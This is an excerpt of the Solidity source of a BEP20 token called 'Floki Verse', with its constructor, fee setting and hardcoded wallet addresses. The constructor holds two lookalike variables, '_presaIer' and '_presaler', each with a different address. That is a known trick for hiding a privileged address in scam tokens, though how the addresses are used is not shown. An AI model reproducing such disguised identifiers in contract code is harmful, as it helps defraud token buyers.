...
// TELEGRAM: https://t.me/flokiversetokenofficial

// WEBSITE: https://flokiversetoken.com/
...
contract FLOKIVERSE is IBEP20, Auth {
   using SafeMath for uint256;
   ...
   string constant _name = "Floki Verse";
   string constant _symbol = "FlokiV";
...
uint256 reflectionFee = 400;
   ...
   constructor () Auth(msg.sender) {
       ...
       address _presaIer = 0x6172a5EbDfbeb82d4839FE27C2032eD550e65f12;
       pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
       _allowances[address(this)][address(router)] = type(uint256).max;
 
       distributor = new DividendDistributor(address(router));
       
       address _presaler = 0x6B258449E1157c21C5a554c82EE75804d6104Abc;
       ...
       marketingFeeReceiver = 0x394AaAF693E0A37352668A8d1CF7A2B6dCe1e87a;
